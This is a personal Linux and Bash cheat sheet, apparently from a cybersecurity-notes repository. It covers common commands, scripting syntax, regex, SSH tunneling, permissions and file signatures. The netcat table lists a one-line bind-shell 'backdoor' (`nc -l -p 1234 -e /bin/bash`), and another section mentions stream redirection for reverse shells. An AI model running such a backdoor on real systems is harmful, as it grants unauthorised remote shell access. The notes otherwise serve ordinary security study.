---
# Table of Contents
---

- [Commands and Utilities](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#commands-and-utilities)
	- [AWK](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#awk)
	- [SUDO](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#sudo)
	- [LESS](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#less)
	- [TAIL](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#tail)
	- [WGET](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#wget)
	- [GREP](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#grep)
	- [SCP](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#scp)
	- [FIND](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#find)
	- [PS](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#ps)
	- [CHOWN](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#chown)
	- [NSLOOKUP](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#nslookup)
	- [DIG](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#dig)
	- [UNAME](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#uname)
	- [UNIQ](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#uniq)
	- [SORT](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#sort)
	- [WHOIS](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#whois)
	- [TAR](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#tar)
	- [SYSTEMCTL](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#systemctl)
	- [NETCAT](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#netcat)
	- [IP](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#ip)
	- [TMUX](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#tmux)
- [Bash Scripting](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#bash-scripting-basics) 
- [Theory](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#theory)
	- [Crontab](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#crontab)
	- [Regex Basics](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#regex-basics)
	- [Logical Operators](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#logical-operators)
	- [SSH Tunneling](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#ssh-tunneling)
	- [Access Rights](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#access-rights)
	- [Data Streams, Redirects](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#data-streams-redirects)
	- [File signatures](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#file-signatures)
- [Useful Commands](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#useful-commands)

---
---
# Commands and Utilities
---
---

## AWK

**Specified Programming Language, which we could use for easy scripts**

---

|Command | Explanation | 
|----------|-------------|
| `$1`  | First column, 
| `$0` | All columns | 
| `$NF`  | Last colums |
| `awk '{print $1}'`  | Output of the first column |
| `OFS="/"` | Change separator to / |
| `BEGIN {print "Kek"}` | Before the main command, display Kek |
| `-F:` | We show that the string uses a separator: : |
| `$3 >= 1000` | The value of the third column is less than more than 1000 |
| `/UUID/`  | Look for UUID pattern |
| `/^UUID/` | Look for pattern which begins with UUID |

---

## TEE

**Command for Redirecting Output in Linux**

| Command | Explanation |
|-|-|
|`command` | tee file` | Redirect output of command to file and display on the terminal |
|`command` | tee -a file | Append output of command to file and display on the terminal |
|`tee file1 file2` | Redirect output to multiple files simultaneously |
|`tee -a file1 file2` | Append output to multiple files simultaneously |
|`echo "Text" \| tee file ` | Display and save "Text" to file |
|`command1 \| tee > (command2)` | Pipe output of command1 to command2 and display on the terminal |
|`command \| tee /dev/tty` | Display output on the terminal, but not redirect to a file |



## SUDO

**Linux utility that provides the ability to execute commands with different levels of access, including root**

---

| Command | Explanation |
|-|-|
|`sudo -l` | Check privileges|
|`sudo -u` | Do smth on behalf of the user |
|`sudo su` | Change to root user |
|`sudo` | Do smth on behalf of root user|

---

## LESS

**If the file is very large, this utility does not allow you to clog up the entire term of the terminal, that is, it shortens the output and allows you to scroll up and down**

---

| Command | Explanation |
| ------|-------|
|`less -F` | Monitor changes in the file| 
|`less -X` |Leave what was in the file without deleting it after disabling the command|
|`less -N` | Number lines |

---
## TAIL

**Command used to output the contents of a file, usually at the end of that file**

---

| Command | Explanation |
| ------|-------|
|`tail -50` | Lines, need to be taken from the end|
|`tail +50` | Lines, need to be taken from the beginning|
|`tail -c` | Number of bytes to be removed from the end|
|`tail -F` | Look for changes in a file|

---

## WGET 

**Download files from sites**

---

|Command|Explanation|
|-|-|
|`wget IP`| Download the file from the site|
|`wget -O` | Download the file under a new name|
|`wget -i` | Download a file from the list|

---
## GREP

**Linux command used to search for text strings in files or other commands output**

---

|Command|Explanation|
|-|-|
|`grep "text" file.txt` | Find text in a file|
|`grep -i` | Search regardless of case|
|`grep "text" file1.txt file2.txt` | Search in two files
|`grep -r "text" documents/ -e "*.txt"` |Search in the documents directory only in .txt files|
|`grep -r "text"` | Search in local directories and subdirectories|

---


## SCP

**Linux command, which is used to securely copy files and directories from one computer to another over a network**

---

|Command|Explanation|
|-|-|
|`scp username@remote_server:/full/path/to/remote_file /local/path/to/local_directory/`|From remote to local|
|`scp /local/path/to/local_file username@remote_server:/remote/path/to/destination/`|From local to remote|

---

## FIND

**Linux command used to search for various information in the file system**

---
|Command|Explanation|
|-|-|
|`.`| Current directory|
|`./kek` | Relative directory|
|`/home/carnifex17/kek` | Absolute path to the directory|
| `find ./GFG -perm 664` | Search for files with permissions 664 in the \.GFG directory|
|`-name` | File name|
|`-type f` | This option specifies that only files are searched.|
|`-type d` | Only directories are being searched.|
|`find . -type f -mtime -3`| Гsed to search for files by their modification time The file was modified less than 3 days ago|

---
## PS

**A program for Linux that is designed to search for various system processes**

---

|Command|Explanation|
|-|-|
|`ps aux` | All processes|
|`ps -p PID`| Additional info about PID|
|`ps -u shrek` | Additional info from **shrek** user|

---
## CHOWN

**A command in the Linux operating system that is used to change the owner or group of a file or directory**

---

|Command|Explanation|
|-|-|
|`chown owner_name file_name`| Change owner|
|`chown :group1 file1.txt`|Change group of file|
|`chown master:group1 file1.txt`| Change both|
|`chown --reference=greek1 greek2`| Use greek1 rights as reference|

---
## NSLOOKUP

**An operating system command used to perform DNS queries and obtain information about domain names, IP addresses, and other DNS records.**

---

|Command|Explanation|
|-|-|
|`nslookup -type=any` | List all available DNS records |
|`nslookup -type={type of dns recording}` |Search for certain DNS record|
|`A`, `MX`, `NS`, `TXT`, `SOA`, `AAAA`, `CNAME` |Types of DNS records|

---
## DIG

**Younger sibling of nslookup**

---

|Command|Explanation|
|-|-|
|`dig site.com +short` | A record|
|`dig site.com +nocomments` |No comments|
|`dig site.com ANY` | All records|
|`dig site.com +trace` | Trace DNS path|

---
## UNAME

**A command in the Unix operating system and similar systems that displays information about the system and its kernel.**

---

|Command|Explanation|
|-|-|
| `uname -a` |All system info|
| `uname -s`|Kernel name|
| `uname -r`|Kernel release date|

---

## UNIQ

**Linux command which looks for repeatings strings and helps to manage them**

---

|Command|Explanation|
|-|-|
|`uniq -c`| Counts how many times it is repeated|
| `uniq -d`| Only displays repeated feeds|
| `uniq -u` | Displays unique feeds|

---

## SORT

**You will never guess what it does**

---

|Command|Explanation|
|-|-|
| `sort -o outputfile.txt inputfile.txt` |Sorting with output to a specified file|
| `sort -r`|Sorting in reverse order|
| `sort -n`|Sorting by numbers|
| `sort -nr`|Sorting by numbers in reverse order|
| `sort -k 2n file.txt`|Sort by second column by numbers|

---
## WHOIS

**Command Linux, which looks for info about domains**

---

|Command|Explanation|
|-|-|
|`whois site.com` | Displaying information by domain name|
|`whois 125.8.888.200`| Displaying information by IP address|

---
## TAR

**Linux command used to unzip tar format**

---

|Command|Explanation|
|-|-|
|`tar -xvf file.tar`| Detailed unzipping|

---
## SYSTEMCTL

**Linux command to manage different services**

---

|Command|Explanation|
|-|-|
|`sudo systemctl restart service`| Restart service|
|`sudo systemctl status service`|Check service status|
|`sudo systemctl stop service`|Stop service|
|`sudo systemctl --type=service --state=running`|List active service|

---

## NETCAT

**Universal utility for network connection in Unix and similar operating systems**

---

|Command|Explanation|
|-|-|
|`nc host port`|Connects to the host on the specified port|
|`nc -l -p port`|Starts nc in listener mode on the specified port|
|`nc -z host {port-range}`|Basic port scanner|
|`nc -v host port`|Get banner|
|`nc -l -p local_port -c 'nc remote_host remote_port'`|Configures a basic proxy where it listens for a specific local port and forwards it to a remote server|
|`nc -l -p 1234 -e /bin/bash`|Simple backdoor|

---


## IP

**Linux command to manage ІР. Older brother of ifconfig**

---

|Command|Explanation|
|-|-|
|`ip addr`|Shows all addresses|
|`ip -4 addr`|Shows IPv4 address|
|`ip -6 addr`|Shows IPv6 address|
---

# Bash Scripting Basics

**Bash is the scripting language we use to communicate with Unix-based OS and give commands to the system.**

---

#### Script Execution - Examples
```bash
carnifex17@kali[/kali]$ bash script.sh <optional arguments>
carnifex17@kali[/kali]$ sh script.sh <optional arguments>
carnifex17@kali[/kali]$ ./script.sh <optional arguments>
```
---

#### Shebang
The `#!/bin/bash` at the beginning of a Bash script is known as a shebang or hashbang. It serves as a directive to the operating system, indicating which interpreter should be used to execute the script.

## Conditional Execution

#### If-Else
```bash
if [condition]
then [execution]
else [what would be executed if condition would fail]
fi [closing]
```
#### If-Only
```bash
if [condition]
then [execution]
fi [closing]
```
#### If-Elif-Else
```bash
if [first condition]
then [execution]
elif [second condition]
then [execution]
else [what would be executed if conditions would fail]
fi [closing]
```
#### Case
```bash
case <expression> in
	pattern_1 ) statements ;;
	pattern_2 ) statements ;;
	pattern_3 ) statements ;;
esac

```
**Example::**
```bash
case $opt in 
	"1") network_range ;;
	"2") ping_host ;;
	"3") network_range && ping_host ;;
	"*") exit 0 ;;
esac
```
---
### Comparison Operators
| Operator | Explanation |
|-|-|
| `-eq` | equal to |
| `-ne` | not equal to |
| `-lt` | less than |
| `-le` | less than or equal to |
| `-gt` | greater than |
| `-ge` | greater than or equal to |

### String Operators
|Operator|Description|
|-|-|
|`==`|is equal to|
|`!=`|is not equal to|
|`<`| 	is less than in ASCII alphabetical order|
|`>`| 	is greater than in ASCII alphabetical order|
|`-z`|if the string is empty (null)|
|`-n`|if the string is not null|

### File Operators

|Operator|Description|
|-|-|
|`-e `|if the file exist|
|`-f `|tests if it is a file|
|`-d `|tests if it is a directory|
|`-L `|tests if it is if a symbolic link|
|`-N `|checks if the file was modified after it was last read|
|`-O `|if the current user owns the file|
|`-G `|if the file’s group id matches the current user’s|
|`-s `|tests if the file has a size greater than 0|
|`-r `|tests if the file has read permission|
|`-w `|tests if the file has write permission|
|`-x `|tests if the file has execute permission|



### Special Variables
| | |
|-|-|
|`$#`|Number of arguments passed to the script.|
|`$@`|List of command-line arguments.|
|`$n`|`n` is number of argument|
|`$$`|Id of executing process|
|`$?`|Success of command. `0` is success, `1` is a failure|

### Regular Variables

```bash
> variable="Declared without an error."
> echo $variable
> Declared without an error.
```
## Arrays

```bash
> domains=(shadow wizard money gang)
> echo ${domains[0]}
> shadow
```
**OR**
```bash
> domains=(shadow wizard "money gang")
> echo ${domains[2]}
> money gang
```

## Loops

### For 
```bash
for variable in list
do
    # Commands to be executed for each item in the list
done
```
**Example:**
```bash
fruits=("apple" "orange" "banana")
for fruit in "${fruits[@]}"
do
    echo "I like $fruit"
done
```
---
### While
```bash
while [ condition ]
do
    # Commands to be executed while the condition is true
done
```
**Example:**
```bash
count=1 # Count from 1 to 5
while [ $count -le 5 ]
do
    echo $count
    ((count++))
done
```
---
### Until
```bash
until [ condition ]
do
    # Commands to be executed until the condition becomes true
done
```
**Example:**
```bash
count=1 # Count from 1 to 5
until [ $count -gt 5 ]
do
    echo $count
    ((count++))
done
```


### Script Termination

|Exit Status|Explanation|
|-|-|
|`exit 0`|Succesful execution|
|`exit 1`|General error condition|
|`exit 2`|Specific error condition|

### Wildcards
**In Bash, a wildcard refers to a character or a set of characters that can be used to represent a group of filenames or strings. Wildcards are often used in commands to perform operations on multiple files or strings that match a specified pattern.**
| Wildcard       | Example Usage                    | Explanation                                             |
|-----------------|----------------------------------|---------------------------------------------------------|
| `*` (Asterisk)  | `echo *.txt`                     | Matches all files ending with ".txt".                   |
| `?` (Question Mark) | `ls file?.txt`                | Matches files like "file1.txt", "fileA.txt", etc.       |
| `[ ]` (Square Brackets) | `ls [aeiou]*.txt`          | Matches any file starting with a vowel and ending with ".txt". |
| `{ }` (Brace Expansion) | `cp file{1,2,3}.txt dest/` | Expands to "file1.txt", "file2.txt", and "file3.txt" and copies to the destination. |
| `!(pattern)` (Extended Pattern Matching) | `ls !(file*.txt)`    | Matches all files except those starting with "file" and ending with ".txt". |
| `?(pattern)` (Zero or One Occurrence) | `ls file?(1).txt`   | Matches "file.txt" or "file1.txt".                      |
| `+(pattern)` (One or More Occurrences) | `ls file+(1).txt`  | Matches "file1.txt", "file11.txt", etc.                 |
| `*(pattern)` (Zero or More Occurrences) | `ls file*(1).txt` | Matches "file.txt", "file1.txt", "file11.txt", etc.    |

### Tips & Tricks

1. You Could use `tee` command for writing output to both standard output and file. If you would use `tee -a`, it would
2. Use `bash -x -v` to verbose debugging

---
# Theory 
---

## Crontab
---
**`Cron` jobs in Linux allow users to run commands at the specific date and time. To list all scheduled tasks for the user**

-  `crontab -l`
**Look for your crontab file**

-  `crontab -e` 
**To edit your crontab file**

**If this command is run at the first time user will be asked to choose text editor for editing this file.To create a scheduled command user needs to create a records based on the following template**
- `m h dom mon dow command`

**Also you could check privileges for files like this, to locate cron jobs:**
- `/etc/crontab`
- `/etc/cron.d`
- `/var/spool/cron/crontabs/root`

[Useful link to make date](https://crontab.guru/#25_18_8_11_0)

---

## Regex Basics
**Regular expressions, often referred to as regex or regexp, are a powerful tool for pattern matching and text manipulation. They provide a concise and flexible way to search for, match, and extract specific patterns in text data. Regex is supported in many programming languages and text editors. Here are some of the basics of regex with examples for each feature:**

---
- **Literal Characters:**
	- A regex can represent literal characters. For example, the regex `cat` will match the word "cat" in a text.
- **Character Classes:**
	- Square brackets `[]` are used to define character classes. For example, `[aeiou]` matches any vowel, and `[0-9]` matches any digit.
- **Quantifiers:**
	- Quantifiers specify how many times a character or group of characters should be repeated.
	- `*` matches zero or more of the preceding element. For example, `ca*t` matches "ct," "cat," "caat," and so on.
	- `+` matches one or more of the preceding element. For example, `ca+t` matches "cat," "caat," and so on.
	- `?` matches zero or one of the preceding element. For example, `colou?r` matches "color" and "colour."
- **Wildcard:**
	- The dot `.` represents any character (except a newline character). For example, `c.t` matches "cat," "cut," "c8t," etc.
- **Anchors:**
	- `^` matches the start of a line. For example, `^abc` matches "abc" only if it's at the beginning of a line.
	- `$` matches the end of a line. For example, `xyz$` matches "xyz" only if it's at the end of a line.
- **Groups and Alternation:**
	- Parentheses `()` are used to create groups.
	- `|` represents alternation (OR). For example, `(cat|dog)` matches either "cat" or "dog."
- **Character Escapes:**
	- Some characters have special meanings in regex and need to be escaped with a backslash. For example, `\.` matches a literal period.
- **Quantifier Min and Max:**
	- Curly braces `{}` allow you to specify the minimum and maximum number of repetitions. For example, `a{2,4}` matches "aa," "aaa," and "aaaa."
- **Character Shorthands:**
	- There are shorthands for common character classes:
		- `\d` matches any digit (equivalent to `[0-9]`).
		- `\w` matches any word character (equivalent to `[a-zA-Z0-9_]`).
		- `\s` matches any whitespace character (spaces, tabs, line breaks, etc.).
- **Negation:**
	- You can use `^` inside a character class to negate it. For example, `[^0-9]` matches any character that is not a digit.
- **Backreferences:**
	- You can refer to matched groups later in the regex using backreferences. For example, `(abc)\1` matches "abcabc."
- **Modifiers:**
	- Flags like `i` (case-insensitive) can be added after the regex to change its behavior. For example, `/cat/i` matches "cat," "Cat," or "CAT."
---
Here are some examples of regular expressions and what they match:
- `/^abc/` matches "abc" at the beginning of a line.
- `/[0-9]+/` matches one or more digits.
- `/colou?r/` matches "color" or "colour."
- `/[A-Za-z]+/` matches one or more uppercase or lowercase letters.
- `/[aeiou]{2,4}/` matches 2 to 4 consecutive vowels.

---
## Logical Operators

**Symbols or keywords in Linux that are used to process and compare logical values.**

---

|`Syntax`|`Explanation`|
|-|-|
|**&&** |(AND)|
|`Command1 && Command2`| Executes Command2 only if Command1 succeeds (returns a zero exit code). If Command1 fails, Command2 is not executed|
|**II** |(OR)|
|`Command1 II Command2`|Executes Command2 only if Command1 fails (returns a non-zero exit code). If Command1 succeeds, Command2 is not executed|
|**;**| (Semicolon)|
|`Command1 ; Command2`|Executes Command2 regardless of the success or failure of Command1. Used for sequential execution of commands|
 |**&** |(Background Execution)|
|`Command &`| Executes the command in the background, allowing you to continue working in the terminal without waiting for the command to complete. You can use the **bg** or **jobs** commands to control background processes|
|**!**| (NOT)|
|`! Command`| Executes the command and returns the reverse exit code. If Command succeeds, ! Command fails, and vice versa|
| **I** | (PIPE)|
|`Command1 I Command2`| Redirects the output of Command1 to the input of Command2. Used to transfer data between commands and filter the output|

---



## SSH Tunneling

* `SSH Tunneling` - is a mechanism that allows you to securely transfer data over an unsecured network by encrypting and securing the connection between two points.  
`SSH (Secure Shell)` -  is a protocol for secure remote computer operation and data transfer, and it is used to create these secure tunnels. Mostly we could do the same things with local and reverse tunneling, but it depends which things we are controlling, remote server or local computer. Also to not be confused, you should always remember that "local" is subjective term.*
Also [this](https://youtu.be/AtuAdk4MwWw?si=85DZ-shYuHFJIqX2) video explains very well this topic
---

The main types of SSH Tunneling include:

1.    **`Local Port Forwarding`**: This type of tunneling allows you to pass traffic between your local computer and a remote server over SSH. So shortly we just communicate to some remote service, but in system level all requests to remote server will come through our our local port. It is pretty useful if we want to communicate to remote database as it is our local database. Useful stuff

<img width="500" height="500" src="https://github.com/carnifex17/Cybersecurity-Notes/blob/main/images/ssh-image1.jpg">

```
ssh -L local_port:destination_address:destination_port username@remote_server
```
---
2.    **`Remote or Reverse Port Forwarding`**: In this case, the remote server is used to transfer traffic from the remote port to the local computer. 

<img width="500" height="500" src="https://github.com/carnifex17/Cybersecurity-Notes/blob/main/images/ssh-image2.jpg">

```
ssh -R remote_port:localhost:local_port username@local_machine_ip
```
3.    **`Dynamic Port Forwarding`**: This type of tunneling allows you to create a "proxy" on a remote server through which you can route traffic from your local computer through the remote server to various Internet resources. This is especially useful when you need anonymous access to the Internet or when you need to bypass network restrictions.
```
ssh -D local_socks_port username@remote_server
```
---



## Access Rights

**Linux has its own scheme for displaying access rights using numbers to make it quick and easy to show which rights are where. Each three digits corresponds to three access rights (read, write, execute) for three different categories of users (owner, group, other).
Each of these digits can have a value from 0 to 7, where each value represents a combination of three possible access rights:**

>0 - (no rights).
>1 - (execute).
>2 - (write).
>4 - (read).

---

### **File Rights**

To set permissions using numbers, you simply add the number values for each category together:
For example, `chmod 755 file.txt' sets the following permissions:
1. The owner has read, write, and execute permissions (4 + 2 + 1 = 7).
2. Group has read and execute permissions (4 + 1 = 5).
3. Other users have read and execute permissions (4 + 1 = 5).

---

### **Directory Rights**.

For example, in the directory, it displays `drwxr-xr-x`.
The first character `d` is the type of object. In this case, `d` indicates that it is a directory. The rest of the `rwxr-xr-x` string consists of **nine** characters that represent access rights for different categories of users (***owner, group, and others***). This part of the string can be considered as three sets of three characters each.

The first set `rwx` represents the access rights for the ***object owner***:

1. `r` ***Owner*** has the right to read the file or view the contents of the directory. 
2. `-` ***Owner*** has the right to write or edit the file or create new files in the directory.
3. `x` ***Owner*** has the right to execute the file (for directories, this means the ability to access it as a directory).

The second set of `r-x` represents the access rights for a ***user group***:

1. `r` ***Group*** has the right to read the file or view the contents of the directory.
2. `-` ***Group*** does not have the right to write the file or create new files in the directory.
3. `x` ***Group*** has the right to execute the file (for directories).

The third set of `r-x` represents access rights for ***other users*** (users who are not owners and do not belong to the group):
1. `r` ***Other users*** have the right to read the file or view the contents of the directory.
2. `-` ***Other users*** do not have the right to write the file or create new files in the directory.
3. `x` ***Other users*** have the right to execute the file (for directories).


## Data Streams, Redirects

**In Linux, there is such a thing as *data streams*, which are used to transmit input/output data in programs. Each of them has its own *descriptor*, a numeric identifier that helps to interact with them more easily**
- `STDIN` - Descriptor 0. Input stream
- `STDOUT` - Descriptor 1. Output stream
- `STDERR` - Descriptor 2. Error stream
- The output in the output streams is separate and in parallel.

---

***REDIRECT( > )* is redirect of the command output to the file `(ls > dirs.txt).` Redirect by default is through the `stdout` stream, but it can be changed. 
`cat unexistedfile.txt 2> error.txt`
*Reverse redirect ( < )* is redirect of the output stream through `stdin` so that the input is not through the keyboard but through the file**

---
### Examples

`2>&1` 
*If we redirect the output from `stderr`, we output to the same place as the output from `stdout`. And with this we can output both simple output and errors in one file, one stream*.

`0>&1`
*By using **0>&1**, you are actually telling the shell to read `stdin` from the same source as `stdout`. This can be useful in cases where you need to merge or copy input and output streams for interactive input, for example in reverse shells*.

---

## File signatures

File signatures, commonly referred to as "**magic bytes**", are specific byte sequences at the beginning of a file that identify or verify its content type and format. These bytes often have corresponding **ASCII** characters, allowing for easier human readability when inspected. The identification process helps software applications quickly determine whether a file is in a format they can handle, aiding operational functionality and security measures.

- In cyber security, file signatures are crucial for identifying file types and formats. You'll encounter them in malware analysis, incident response, network traffic inspection, web security checks, and forensics. Knowing how to work with these magic bytes can help you quickly identify malicious or suspicious activity and choose the right tools for deeper analysis.

**Here is a list of some of the most common files and their magic:**

|File Format|Magic Bytes|ASCII|
|-|-|-|
|PNG image file|89 50 4E 47 0D 0A 1A 0A|%PNG|
|GIF image file|47 49 46 38|GIF8|
|Windows and DOS executables|4D 5A|MZ|
|Linux ELF executables|7F 45 4C 46|.ELF|
|MP3 audio file|49 44 33|ID3|

- You could look all magic bytes [here](https://en.wikipedia.org/wiki/List_of_file_signatures)
---

# Useful Commands

---

**Generate public and private key pair (id_rsa and id_rsa.pub). If you want to add your ssh key to some shell, just copy-paste id_rsa.pub contents into ~/.ssh/authorized_keys file**

```
ssh-keygen -o
```
---

**[CeWL](https://www.geeksforgeeks.org/cewl-tool-creating-custom-wordlists-tool-in-kali-linux/) (pronounced "cool") is a custom word list generator tool that spiders websites to create word lists based on the site's content**
```
cewl -d 0 -m 5 -w usernames.txt http://MACHINE_IP/team.php --lowercase
```
---
**The `cut` command allows you to extract specific sections (columns) of lines from a file or input stream by "cutting" the line into columns based on a delimiter and selecting which columns to display**

```
--> cut -d ' ' -f1,3,6 access.log
[2023/10/25:15:42:02] sway.com:443 200
[2023/10/25:15:42:02] sway.com:443 301
```

---
**The [top](https://www.geeksforgeeks.org/top-command-in-linux-with-examples/) command shows you a list of processes in real time with their usage. It's a dynamic list, meaning it changes with the resource usage of each process.**

---

**Look for an installed software**

```magic
dpkg -l
```

**Base64 encode/decode**
```bash
base64 [encode]
base64 -d [decode]
```
---

